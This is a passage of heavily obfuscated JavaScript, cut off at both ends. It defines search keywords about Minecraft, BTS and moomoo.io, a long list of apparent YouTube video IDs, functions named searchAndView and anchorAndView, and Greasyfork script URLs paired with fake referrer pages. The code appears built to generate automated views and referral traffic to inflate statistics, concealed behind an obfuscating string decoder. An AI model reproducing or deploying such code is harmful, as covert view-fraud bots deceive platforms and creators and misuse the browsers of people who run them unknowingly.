'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x3 * -0x5fe + -0x1 * 0xadf + 0x1 * 0x1ce3)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * -0x235 + 0xc63 + -0x26d * 0x6)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1b4f * 0x1 + -0x139 + -0x1a13);

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x16 + 0x2 * -0xd4f + 0x1ab4);
    let h = e[f];
    if (c['AaNMyo'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2395 + 0x2695 + -0x300, r, s, t = -0x7 * 0x286 + -0x1 * -0x2440 + -0x1296; s = m['charAt'](t++); ~s && (r = q % (0xeaa + 0x9d * -0xb + -0x7e7) ? r * (0x2 * 0xdbd + -0x11a9 + -0x991) + s : s, q++ % (0x2 * 0x737 + -0x1924 * -0x1 + -0x13c7 * 0x2)) ? o += String['fromCharCode'](-0xe7 + -0x12d9 * -0x1 + -0x10f3 * 0x1 & r >> (-(-0x1e82 + -0x2 * 0x487 + 0x2792) * q & 0xfaf * -0x2 + 0x557 * -0x3 + 0x2f69 * 0x1)) : -0x19 * 0xe9 + 0x23e2 + -0xd21 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x30b + -0x7a * -0xb + -0x233, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x59 * -0x17 + -0x730 + -0xbf))['slice'](-(0x445 * 0x7 + 0xa08 + -0x27e9 * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['zqmlws'] = i, b = arguments, c['AaNMyo'] = !![];
    }
    const j = e[0xa29 + 0xef6 + 0x3b * -0x6d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['zqmlws'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    V(0x14) + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    X(0x8, 'Dj7x') + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + X(0x16, 'aDqV') + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + X(0x10, 'N]C1') + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + V(0x4) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x2, 'mT6W') + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + X(0x1, 'i^p4') + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
